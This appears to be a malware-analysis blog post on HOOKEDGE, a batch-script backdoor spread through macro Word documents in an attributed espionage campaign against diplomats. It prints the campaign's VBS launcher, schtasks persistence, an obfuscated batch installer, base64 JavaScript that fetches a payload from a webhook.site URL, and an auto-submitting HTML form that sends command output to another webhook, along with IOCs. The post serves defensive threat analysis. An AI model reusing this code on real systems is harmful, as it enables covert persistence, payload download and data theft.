---
title: "HOOKEDGE , a light weight backdoor used by BLueDelta to target EU diplomats"
date: 2026-09-02 16:00:30 +0300
categories: [malware analysis, PE file structure] 
tags: [misc,malware]
---

In this blog post , we are going to be analyzing an instance of an earlier campaign , conducted by **BlueDelta** group  (which overlaps with APT28, Fancy Bear, and Forest Blizzard) , that targets **Euopean Union** Diplomats with Malicious Word-Documents carrying **HOOKEDGE**, a  light-weight , batch script backdoor .

## Background 

Between Late September 2025 and early April 2026 , [Insikt group](https://www.recordedfuture.com/research/bluedelta-targets-with-hookedge) has identified Several Initial-Access campaigns conducted by  **BlueDelta** Group , Targetting Diplomatic agencies in Romania , Turkey and Spain .

[Insikt Group](https://www.recordedfuture.com/research/bluedelta-targets-with-hookedge)  assesses with moderate confidence that this activity was conducted by BlueDelta (**which overlaps with APT28, Fancy Bear, and Forest Blizzard**), a Russian state-sponsored threat group attributed to the Main Directorate of the General Staff of the Armed Forces of the Russian Federation (GRU). This assessment is based on significant code and tradecraft overlap between HOOKEDGE and the HEADLACE backdoor used in prior BlueDelta campaigns, consistent infrastructure patterns, and targeting consistent with known Russian intelligence collection priorities.


These campaigns Used a phishing Word document , carrying malicious **VBA** macros , acting as a  **Dropper** for  **HOOKEDGE** ,  a light weight , windows based batch script , that executes commands , and **exfiltrates** results  to the C2  By form-submission  via **Microsoft-Edge** .


During these campaigns , attackers did not use a dedicated infrastructure , instead , they relied on the  free-tier of the publicly available  **WebHook.site** service .

This light-weight infrastructure makes the campaign harder to track , since **webhook.site** is a legitimate publicy available service that anyone can use . This also makes the campaign harder to take-down , since there is no **central** infrastructure . 

Another wonderfull attempt from the adversaries to evade detection is the usage of **Microsoft Edge** for C2 exfiltration . Attackers would collect Data  in an **Auto-submision** form , then use **Edge** to send this form , causing data to be exfiltrated to the attackers . From a defender point of observe , it  will appear like  **Edge** is doing outbound connections , which is a non-anomalous behavior .


## Initial access and execution 

The attack starts by a malicious word document , carrying **VBA** macro . The Document would use the popular **click-fix** social-engineering tactic , where adversaries  guide the victim to do certain things to be able to access promised content. 

The Document would ask from the victim to  click **Enable content** to be able to view the document content , which effectively launches the malicious VBA-macro . 

![Click-fix Document](/resources/HOOKEdge_article_rsrcs/lure.PNG)


The **VBA** macro will drop **seven** files to the ```userprofile``` , acting as a covulted multi-stage execution chain .

Files :

```

%userprofile%\\9f2837e2-8321-46a5-aee5-ccdda349f864.vbs

%userprofile%\\9f2837e2-8321-46a5-aee5-ccdda349f864.bat

%userprofile%\\9f2837e2-8321-46a5-aee5-ccdda349f86464.cmd

%userprofile%\\d993e113-a672-48aa-a382-64c5aaac56eb.vbs

%userprofile%\9f2837e2-8321-46a5-aee5-ccdda349f864.htm

%userprofile%\\9f2837e2-8321-46a5-aee5-ccdda349f864.xhtml

%userprofile%\9f2837e2-8321-46a5-aee5-ccdda349f864.xml


```


These names are not random , they are the **UUID** part in the **webhook** url .


**They follow this pattern :**

For all files except the fourth file (will analyze it in a bit)  , there name is the same as the **UUID** of the **webhook** endpoint , that will deliver the **HOOKEDGE** backdoor .

But for the **fourth** file , it's name is the same as **UUID** of the **webhook** Endpoint that will be used for exfiltration .


<br>
Finally , once the **Macro** finishes execution , the document shows an error box , which tells the victim that **word** failed to read the file . This aims to distract the user of what has happened in the background  , and decieves the user to raise no suspicion when the **promised** content was not shown .

![Error Lure](/resources/HOOKEdge_article_rsrcs/error.PNG)



## Malware execution chain 

Adversaries used a convoluted multi-step  execution chain , which eventually just creates a **scheduled** task to run the **HOOKEDGE** dropper every 61 minutes .

Adversaries use this approach for many reasons . One of them is to make it harder  for **security analyst** to track the execution and find important payloads . Another reason is to possibly time-out sandboxes that do not run the **sample** long enough to capture all stages .



Firstly , the malicious document runs file 4 ```%userprofile%\\d993e113-a672-48aa-a382-64c5aaac56eb.vbs``` , which contains the following code  :


```
CreateObject("Wscript.Shell").Run CreateObject("Wscript.Shell").ExpandEnvironmentStrings("%userprofile%\9f2837e2-8321-46a5-aee5-ccdda349f864.cmd"), 0, True
```

It runs ```9f2837e2-8321-46a5-aee5-ccdda349f864.cmd```  which creates a scheduled task using ```schtask``` utilizing the previously dropped  ```%userprofile%\9f2837e2-8321-46a5-aee5-ccdda349f864.xml``` for task registration .


```
schtasks /create /xml "%userprofile%\9f2837e2-8321-46a5-aee5-ccdda349f864.xml" /tn 9f2837e2-8321-46a5-aee5-ccdda349f864 /f
del /q /f "%userprofile%\9f2837e2-8321-46a5-aee5-ccdda349f864.xml"
del /q /f "%userprofile%\d993e113-a672-48aa-a382-64c5aaac56eb.vbs"
del %0
```

Finally , it cleans the initial **.vbs** and the task definition **.xml** to reduce forensics-footprint .

Now , moving to the scheduled task , based on the **.xml** task definition ,
the task has the following info : 

```
Name : 9f2837e2-8321-46a5-aee5-ccdda349f864 (same as the other files)

Period : launches every 61 Minute

Action : %userprofile%\9f2837e2-8321-46a5-aee5-ccdda349f864.vbs %userprofile%\9f2837e2-8321-46a5-aee5-ccdda349f864.bat (Just run the .bat using the .vbs script)

RunAs : current user

```

The launched **.vbs** just executes the **9f2837e2-8321-46a5-aee5-ccdda349f864.bat** file (which is the HOOKEDGE installer and exfiltrator) 


**Note : The big time interval 61 Minute , is to avoid consuming the max limit for the Webhoo.site provided hook** 

**Note : After the HOOKEDGE is installed , the attacker does local-discovery , and if they discover that the victim is of high-interest  , the send a similar script to create a similar task , but with higher execution frequency (every 5 Minutes)**


### HOOKEDGE installer  

The following .bat script is executed repeatedly by the scheduled task : 

```
@echo off   'installer script for HOOKEDGE backdoor , will be run every 61 mins
set m1=msed
set m2=ge.e
set m3=xe
set s1=sta
set s2=rt
set c1=c
set c2=all
set d1=d
set d2=el
set t1=ty
set t2=pe
set tk1=tas
set tk2=kkill
set cp1=co
set cp2=py
%d1%%d2% /q /f "%userprofile%\Downloads\*.864"      :: clean files
%d1%%d2% /q /f "%userprofile%\Downloads\*.tmp"
%d1%%d2% /q /f "%userprofile%\Downloads\*.crdownload"
%tk1%%tk2% /f /im %m1%%m2%%m3%              'terminate edge

:: previously , it was launched in headless mode , now , just launch minimized in an extreme location
%s1%%s2% "" %m1%%m2%%m3% --window-size=1,1 --window-position=10000,10000 --ignore-certificate-errors data:text/html;base64,PHNjcmlwdD4oYXN5bmMgKCk9Pntjb25zdCByZXNwb25zZT1hd2FpdCBmZXRjaCgnaHR0cHM6Ly93ZWJob29rLnNpdGUvOWYyODM3ZTItODMyMS00NmE1LWFlZTUtY2NkZGEzNDlmODY0Jyk7Y29uc3QgYmxvYj1hd2FpdCByZXNwb25zZS5ibG9iKCk7Y29uc3QgbGluaz1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdhJyk7bGluay5ocmVmPVVSTC5jcmVhdGVPYmplY3RVUkwoYmxvYik7bGluay5kb3dubG9hZD0nOWYyODM3ZTItODMyMS00NmE1LWFlZTUtY2NkZGEzNDlmODY0Ljg2NCc7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChsaW5rKTtsaW5rLmNsaWNrKCk7ZG9jdW1lbnQuYm9keS5yZW1vdmVDaGlsZChsaW5rKTtVUkwucmV2b2tlT2JqZWN0VVJMKGxpbmsuaHJlZik7fSkoKTs8L3NjcmlwdD4=
timeout 20

set fileout=%random%%random%%random%.864      ::emptryy it's contents to random+random+random.864
%t1%%t2% "%userprofile%\Downloads\*.864" >> "%userprofile%\%fileout%.cmd"



%d1%%d2% /q /f "%userprofile%\Downloads\*.864" ::clean dropped


%c1%%c2% "%userprofile%\%fileout%.cmd" >> "%userprofile%\%fileout%" 2>&1  :: call the backdoor , emptyying results in %userprofile%\randomrandomradnom

:: exfiltration using form submission , proxied by msedge (using .html and .xhtml form frames)

%cp1%%cp2% "%userprofile%\9f2837e2-8321-46a5-aee5-ccdda349f864.htm" + "%userprofile%\%fileout%" + "%userprofile%\9f2837e2-8321-46a5-aee5-ccdda349f864.xhtml" "%userprofile%\%fileout%.html"
%tk1%%tk2% /f /im %m1%%m2%%m3%
%s1%%s2% "" %m1%%m2%%m3% --window-size=1,1 --window-position=10000,10000 --ignore-certificate-errors "%userprofile%\%fileout%.html"
timeout 20


:: clean this

%d1%%d2% /q /f "%userprofile%\%fileout%.cmd"
%d1%%d2% /q /f "%userprofile%\%fileout%"
%d1%%d2% /q /f "%userprofile%\%fileout%.html"
%tk1%%tk2% /f /im %m1%%m2%%m3%

```

This script launches msedge , with a minimized size ```--window-size=1,1``` 
 and an extreme position so user will not notice it ```--window-position=10000,10000``` 

So , the script will use **msedge** to launch the following JS :


```

::<script>(async ()=>{const response=await fetch('https://webhook.site/9f2837e2-8321-46a5-aee5-ccdda349f864');const blob=await response.blob();const link=document.createElement('a');link.href=URL.createObjectURL(blob);link.download='9f2837e2-8321-46a5-aee5-ccdda349f864.864';document.body.appendChild(link);link.click();document.body.removeChild(link);URL.revokeObjectURL(link.href);})();</script> 
```

This script  will retrieve a **dead drop resolver** from ```https://webhook.site/9f2837e2-8321-46a5-aee5-ccdda349f864``` , then use recieved data as a c2 url (same , webhook ) to download hookedge backdoor (all to ~/downloads using msedge)  (**HOOKEDGE** backdoor name ```9f2837e2-8321-46a5-aee5-ccdda349f864.864```) .


After the **HOOKEDGE** backdoor is executed , it is exfiltrated using **HTML** forms  , as the following : 

```
(this is the content of the dropped  .html file)
<!DOCTYPE html><html><body onload='document.forms[0].submit()'><form action='https://webhook.site/d993e113-a672-48aa-a382-64c5aaac56eb' method='post'><textarea name='w3review'>

<HOOKEDGE execution results here>

</textarea></form>
</body></html>  (the contents of the dropped .xhtml file)

```
This data is again  , exfiltrated absuing **MSedge**  , with the same launch parameters :

```
start"" msedge.exe --window-size=1,1 --window-position=10000,10000 --ignore-certificate-errors "%userprofile%\%fileout%.html"

```

This will trigger form submission , causing **MSedge** to exfiltrate the data .


**We notice that scripts clean all related artifacts progressively , reducing their forensic footprint .**


**Note :** In previous variants of **HOOKEDGE** , msedge was also used , but it was launched in **Headless** mode .



Unfortunately , the contents of **HOOKEDGE** backdoor could not be acquired at the time of analysis . But , since the campaign shares similar tradecraft as  **HEADLACE** backdoor  , we can devise that it would work in the same way : 

```launch an infinite loop ---->recieve commands from the attacker ----> execute ---->retry again```

Some other variants , the dropped backdoor will do basic **discovery** of main directories in the system ,  retrieve victim **public IP address** using ```curl -k https://ipinfo.io``` , exfiltrate via msege ,  then exit . 

<br><br>
**The following graph summarizes the execution chain :** 

![HOOKEDGE execution chain](/resources/HOOKEdge_article_rsrcs/execution_chain.png)



## Tracking macro execution 

It is worth mentioning that for earlier in the campaign , attackers inserted  a  request at the begining of the **Document_open** function , which referenced ```hxxp://webhook[.]site/62114596-33f5-47fb-9012-0223529e5a13/docopened[.]jpg``` . This request acts as a **canary** for macro execution , allowing attackers to assess how many successfull **Macro** execution instances occured .


## IOCs

**File paths and hashes :** 

```

60de48a33886115d8614ffc61d997e862ccad6fa18d1442a2e7fedd422b3c9e6    %userprofile%\9f2837e2-8321-46a5-aee5-ccdda349f864.vbs

f674f2a8363deb250cfae74954d68e04471c407482883e4f9f5f915ca63da58e    %userprofile%\9f2837e2-8321-46a5-aee5-ccdda349f864.bat

6f9c7f358aee27ecfead4c9fb0241c24f59aa349d46409ba17bd606708b7254b    %userprofile%\9f2837e2-8321-46a5-aee5-ccdda349f864.cmd

96ce930fcde9f09d8615ba602c501da2ff1c692e85e766b7c61215832b3fbf4c    %userprofile%d993e113-a672-48aa-a382-64c5aaac56eb.vbs

f8ccc9e33bc60f02b8c53ab93b52f28baa830faa451ac8be000ade5012445e44    %userprofile%\9f2837e2-8321-46a5-aee5-ccdda349f864.htm

685234638450bdac388ff6deaefd3554bd475ee3721f0a0745e34c0eca7e1f7e    %userprofile%9f2837e2-8321-46a5-aee5-ccdda349f864.xhtml

5403963130036fdd9fae9ce22d5ab01a3336a48fa1d29a9317da1801557d96c4    %userprofile%\9f2837e2-8321-46a5-aee5-ccdda349f864.xml


```

**Webhook endpoint contacted for HOOKEDGE dropping : ```https://webhook.site/9f2837e2-8321-46a5-aee5-ccdda349f864```**

**Webhook endpoint contacted for HOOKEDGE exfiltration : ```d993e113-a672-48aa-a382-64c5aaac56eb```**


**references : [BlueDelta Targets Defense and Diplomacy with HOOKEDGE](https://www.recordedfuture.com/research/bluedelta-targets-with-hookedge)**